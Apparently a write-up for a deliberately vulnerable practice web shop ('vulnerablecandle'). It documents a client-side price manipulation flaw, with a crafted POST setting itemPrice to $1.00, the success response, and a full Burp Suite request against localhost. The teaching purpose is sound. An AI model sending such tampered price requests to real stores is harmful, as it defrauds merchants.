# Price Manipulation
Some e-commerce applications mistakenly accept the price of a product as a user input rather than use the database stored value.  vulnerablecandle possesses this vulnerability.

## Exploitation
**Prerequisites:** _Authenticated_

**Location:** _POST /shoppingcarts/add/PRODUCTID/QUANTITY_

Price manipulation involves the Angular application sending an _itemPrice_ POST parameter that specifies the price used to purchase the candle at.  While this price is usually set as the database value, the attacker can manipulate it.  SpringBoot then uses this manipulated price throughout the checkout process.  Below is an exploitation example:

    POST /shoppingcarts/add/10/2
    raw:
    {
        "itemPrice" : 1.00
    }

Here we added two of the product with ID 10 (Cedar Candle) and stated the price of one Cedar candle as $1.00.  When the attacker later checks out their shoppingcart they will pay $2.00 for both candles.

Successful exploitation looks like:

    {
        "success": true,
        "code": 200,
        "message": "Success"
    }

## Burp Suite Example Exploitation

    POST /shoppingcarts/add/10/2 HTTP/1.1
    Host: 127.0.0.1:8081
    Content-Length: 19
    sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
    Accept: application/json, text/plain, */*
    Content-Type: application/json
    X-XSRF-TOKEN: 877dd681-4a9f-41f0-ae74-d1ada25aab32
    sec-ch-ua-mobile: ?0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
    sec-ch-ua-platform: "Windows"
    Origin: http://127.0.0.1:4200
    Sec-Fetch-Site: same-site
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: http://127.0.0.1:4200/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Cookie: XSRF-TOKEN=877dd681-4a9f-41f0-ae74-d1ada25aab32; JSESSIONID=1C77B365979B077008298700287FA604
    Connection: close

    {"itemPrice":1.00}

